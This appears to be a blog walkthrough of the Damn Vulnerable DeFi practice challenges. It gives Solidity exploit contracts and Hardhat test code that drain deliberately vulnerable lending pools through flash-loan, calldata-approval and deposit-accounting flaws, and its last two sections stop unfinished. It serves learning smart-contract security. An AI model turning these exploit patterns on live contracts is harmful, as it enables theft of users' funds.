# Damn Vulnerable DeFi
In this post, we are going to review the Damn Vulnerable DeFi challenges one by one. We are going to analyze the contracts and explore and hack their vulnerabilities.

On [damnvulnerabledefi](https://www.damnvulnerabledefi.xyz/) page you can check the instructions for getting started. Let's go!

## Preliminares
### Tools and Environment
**IDE: Visual Studio Code + Solidity Visual Auditor**

We are going to use Visual Studio Code for taking advantage of one particular VSC extension: the [Solidity Visual Auditor](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor), developed by Consensys Diligence.

This extension will assist us during the challenges, by providing code insights, syntax and semantic highlighting, and visual graphs which represent contracts and interactions.

We can also generate visual graphs by utilizing Surya capabilities, embedded in the pluggin. We'll do this for every challenge, so we get a clear overview on the contracts we are hacking and the calls between them.

**Hardhat**

The development environment we'll use is [Hardhat](https://hardhat.org/). It provides us with a rich testing environment which we'll be using for our hacks. It uses [Ethers.js](https://docs.ethers.io/v5/) library for smart contract interaction.

Using console logs in your contracts for debugging:
```
import "hardhat/console.sol";
(...)
console.log("fdrsw");
```

**Codebase**

We'll have to clone the repository, checkout the latest version and install the dependencies:
```
git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git
cd damn-vulnerable-defi
git checkout v2.2.0
yarn
```
There is one folder called `contracts` where we can find all the challenges, each on a separate folder. We'll also find 3 contracts without a specific folder, which are utilized along the different challenges. These are:
- `DamnValuableNFT.sol`
- `DamnValuableToken.sol`
- `DamnValuableTokenSnapshot.sol`

The other relevant folder is called `test`. Inside we'll find again separate folders for each challenge. Here in the `js` files is where we'll code the solutions and we'll verify them by running the command:

```
yarn run *challenge-name*
```

This command essentially uses the hardhat command for running tests:
```
yarn hardhat test test/*challenge-folder*/*challenge-file*
```

### Setup
For completing the challenges we'll just need to open the challenge scripts on the test folder and include our hack. For validating we simply need to call the script and, voilà!

1. Open a terminal inside the project folder

2. Run the first challenge script
```
yarn run unstoppable
```

Now you'll see that the script will fail - as we haven't yet started to work on the challenge.

## Challenge #1: Unstoppable
### The Goal
The Unstoppable challenge states the following:
> There's a lending pool with a million DVT tokens in balance, offering flash loans for free. If only there was a way to attack and stop the pool from offering flash loans... You start with 100 DVT tokens in balance.

Our goal is to break the Flash Loan functionality from the pool, so it is no longer possible to perform another Flash Loan. Let's start by analizing the `flashLoan`function, to see what we get from there.

### Contract Call Graphs
There are 2 contracts:
- UnstoppableLender.sol
- UnstoppableReceiver.sol

The contract diagrams generated with the Solidity Visual Auditor extension are the following:

<figure style="display:inline-block; text-align:center">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/unstoppable-lender.png" alt="Unstoppable Lender" width="350"/>
    <figcaption>Unstoppable Lender</figcaption>
</figure>
<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/unstoppable-receiver.png" title="Unstoppable Receiver" width="350"/>
    <figcaption>Unstoppable Receiver</figcaption>
</figure>

### Required Knowledge
- [A basic understand of what are flashloans and how do they work](https://docs.aave.com/developers/guides/flash-loans)

### Contracts Highlights
On the `flashLoan(uint256 borrowAmount)` function we can see that it is required that the `poolBalance` equals the `balanceBefore` value. However, where do these values come from?

```
 assert(poolBalance == balanceBefore);
```

A couple of lines above, we can see that the `balanceBefore` value is taken using the `balanceOf` function from the token contract.

```
uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
```

On the other hand, the `poolBalance` value is a contract variable updated every time we call the `depositTokens(uint256 amount)` function.

Does this ring a bell?


### The Hack
As you might be realizing, there is a way in which we can make the assertion of balances `false`, which is, sending some tokens to the pool directly by using the token function `transfer` instead of `depositTokens`.

If we do this, the assertion won't be no longer true, and it won't be possible to execute any other flashloans, as the variable `poolBalance` won't be updated.

So the exploit looks like this. On the `test/unstoppable/unstoppable.challange.js`, include the following code, which performs a transfer to the pool address
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const poolAddr = await this.pool.address
    await this.token.transfer(poolAddr,1) 
});
```
Now, run the script with `yarn run unstoppable` and see how we pass the challenge.

## Challenge #2: Naive Receiver
### The Goal
The Naive Receiver challenge states the following:
> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. (...) A user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH. 

Our goal is to hack the user's contract and drain all the funds. If we can do it with a single transaction is a bonus.

### Contract Call Graphs
There are 2 contracts:
- NaiveReceiverLenderPool.sol
- FlashLoanReceiver.sol

The contract diagrams generated with the Solidity Visual Auditor extension are the following:

<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/naive-receiver.png" alt="Naive Receiver Lender Pool" width="350"/>
    <figcaption>Naive Receiver Lender Pool</figcaption>
</figure>
<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/flashloan-receiver.png" title="FlashLoan Receiver" width="350"/>
    <figcaption>FlashLoan Receiver</figcaption>
</figure>

### Required Knowledge
- For the bonus: [Smart Contract Interfaces](https://cryptomarketpool.com/interface-in-solidity-smart-contracts/)

### Contracts Highlights
The flashLoan function accepts 2 arguments, the borrower address and the borrowerAmount. 
`function flashLoan(address borrower, uint256 borrowAmount)`.
This means that we can "impersonate" the borrower, by passing its contract address.

### The Hack
We are going to impersonate the FlashLoanReceiver contract, by passing its address to the `flashLoan` function, like this:
`await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'))`

We can perform this action 10 times and this will drain all the funds (10ETH).

There is a bonus for performing this in a single transaction. For that, we can setup a simple smart contract, that executes the 10x calls above.

```
// Interface for interacting with the Naive Receiver Lender Pool
interface INaiveReceiverLenderPool {
     function flashLoan(address borrower, uint256 borrowAmount) external;
     function fixedFee() external pure returns (uint256);
}

// Exploit Contract
contract NaiveReceiverExploit {
    function hack(
        INaiveReceiverLenderPool pool,
        address payable receiver
    ) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

On the test code, we'll deploy our exploit contract and execute the hack.

```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Hack with a single transaction using a Smart Contract
    const ExploitFactory = await ethers.getContractFactory('NaiveReceiverExploit', deployer);
    this.exploit = await ExploitFactory.deploy();
    await this.exploit.hack(this.pool.address, this.receiver.address)

    // Hack with 10 transactions
    /*
    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
    .
    .
    .
    x10
    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
    */

    });
```

## Challenge #3: Truster
### The Goal
The Truster challenge states the following:
> A new pool has launched that is offering flash loans of DVT tokens for free. The pool has 1 million DVT tokens in balance. And you have nothing. Take all of them from the pool. In a single transaction.

### Contract Call Graphs
There is only 1 simple contract:
- TrusterLenderPool.sol

The contract diagram generated with the Solidity Visual Auditor extension are the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/truster-lender-pool.png" title="Truster Lender Pool" width="350"/>
    <figcaption>Truster Lender Pool</figcaption>
</figure>


### Required Knowledge
- [ERC20 token specification](https://eips.ethereum.org/EIPS/eip-20)
- [External calls](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#use-caution-when-making-external-calls)

https://ethereum.stackexchange.com/questions/52989/what-is-calldata


### Contracts Highlights
This allows us to call any contract function on the flash loan contract’s behalf which can be exploited. First, we take a flash loan of 0 tokens (such that no repayment is required) and pass the token’s approve function as arguments with a payload that approves our attacker to withdraw all funds in a subsequent transaction. This works because the context under which approve is executed is the flash loan contract because it is the one calling it.

### The Hack
For the function call, what it happens is the following:

1. Hacker calls hack function from TrusterExploit
2. TrusterExploit calls `flashLoan` function from TrusterLenderPool
3. TrusterLenderPool executes an external call to the TrusterExploit contract with data
4. This data turns out to approve all its balance to the attacker's address

We will create a contract where we call the `flashLoan` function from the pool, and we will make use of the functionCall for approving.

```
// Interface for interacting with the Truster Lender Pool
interface ITrusterLenderPool {
     function flashLoan(
        uint256 borrowAmount, 
        address borrower, 
        address target, 
        bytes calldata data
        ) external;
}

// Exploit Contract
contract TrusterExploit {
    function hack(
        IERC20 token,
        ITrusterLenderPool pool,
        address payable hacker
    ) public {
        uint256 poolBalance = token.balanceOf((address(pool)));
        bytes memory approveCalldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
            );
        pool.flashLoan(0, hacker, address(token), approveCalldata);
        token.transferFrom(address(pool), hacker, poolBalance);
    }
}
```

## Challenge #4: Side Entrance
### The Goal
The Side Entrance challenge states the following:
> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Our goal is to take all ETH from the lending pool.

### Contract Call Graphs
There is only 1 simple contract:
- SideEntranceLenderPool.sol

The contract diagram generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/side-entrance.png" title="Side Entrance Lender Pool" width="350"/>
    <figcaption>Side Entrance Lender Pool</figcaption>
</figure>

### Required Knowledge
- [Mapping in Solidity](https://www.alchemy.com/overviews/solidity-mapping)
- [Smart Contract receiving ETH. Split between `receive` and `fallback` into separate functions](https://blog.soliditylang.org/2020/03/26/fallback-receive-split/).

### Contracts Highlights
We have 3 functions, for depositing, withdrawing and performing a flashLoan. The contract keeps track of the balances of each user with the mapping `balances`.

Analyzing the `flashLoan` function we can see that it requires that the pool balance is greater or equal than before performing the flashloan.


We can see that it does not check who are holding these balances though...

### The Hack
We can perfom a flashloan with all the pool balance and utilize the execute function for deposit all the amount into the pool again.
This effectively means that we don't have to return the flashloan, as the require statement just checks that the balance of the pool is greater or equal than the previous balance. This condition will hold, as the pool balance would be the same before the flashloan, the only difference is that now, the balances mapping has changed, and all the pool balance is mapped to our address.

The final step is simply to use the withdraw function for taking all the ETH from the pool.

You can see how balances change on each step in the following table.

| Action      | Pool Balance | Attacker Balance | balances[Attacker] |
| ----------- | ----------- | ----------- | ----------- |
| Initial state  | 1000       | 0 | 0
| flashLoan(ETHER_IN_POOL)   | 0        | 1000 | 0 |
| deposit(){value: ETHER_IN_POOL}   | 1000        | 0 | 1000 |
| withdraw()   | 0        | 1000 | 0 |

The implementation in Solidity would be:
```
// Interface for interacting with the Side Entrance Lender Pool
interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

// Exploit contract
contract SideEntranceExploit {
    using Address for address payable;
    address poolAddr;
    address hackerAddr;
    ISideEntranceLenderPool pool;

    constructor (ISideEntranceLenderPool _pool) {
        hackerAddr = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function flash(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(hackerAddr).sendValue(amount);
    }

    receive() external payable {}

}
```
Few highlights:
- On the function `constructor()`, we'll be initializing the pool interface with its address, as well as grab our attacker address, for being able to pay us back, once we've drained the pool.
- The function `execute()` is needed as it is defined in the pool contract as the interface on how to talk to external contracts (like ours). Here we perform the `deposit`action with the flashLoan amount that we have been granted, so the pool balance is the same as before performing the flashloan.
- The function `flash()`is the one the attacker will call for initiate the attack. It will call the `flashLoan`function from the pool, and once done, it will withdraw the funds and send them to the attacker address.
- The `receive() external payable` will allow our contract to receive ETH, needed when called the `withdraw`() function.

On the test code, we'll then deploy our malicious contract and call the `flash()` function.
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
    this.exploit = await SideEntranceExploit.deploy(this.pool.address);
    await this.exploit.flash(ETHER_IN_POOL);
    });
```


## Challenge #5: The Rewarder
### The Goal
The Rewarder challenge states the following:
> There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don't have any DVT tokens. Rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

Our goal is to claim most rewards for yourself.

### Contract Call Graphs
There are 4 contracts:
- AccountingToken.sol
- FlashLoanerPool.sol
- RewardToken.sol
- TheRewarderPool.sol

The contract diagram for the Rewarder Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/rewarder-pool.png" title="Rewarder Pool" width="750"/>
    <figcaption>Rewarder Pool</figcaption>
</figure>

### Required Knowledge
- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot)
- [Access control and Role setup](https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl-_setupRole-bytes32-address-)

### Contracts Highlights

### The Hack
Make a flash loan to get some DVT tokens.
Approve and deposit the tokens to the rewarder pool. This will immediately call the snapshot function and send rewards.
Previously we have to advance the hardhat vlokchain for 5 days.


## Challenge #6: Selfie
### The Goal
The Rewarder challenge states the following:
> A new cool lending pool has launched! It's now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it.
You start with no DVT tokens in balance, and the pool has 1.5 million.

Our goal is to take all DVT tokens.

### Contract Call Graphs
There are 2 contracts:
- SelfiePool.sol
- SimpleGovernance.sol

The contract diagram for the Selfie Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/selfie-pool.png" title="Selfie Pool" width="750"/>
    <figcaption>Selfie Pool</figcaption>
</figure>



### Required Knowledge

### Contracts Highlights

### The Hack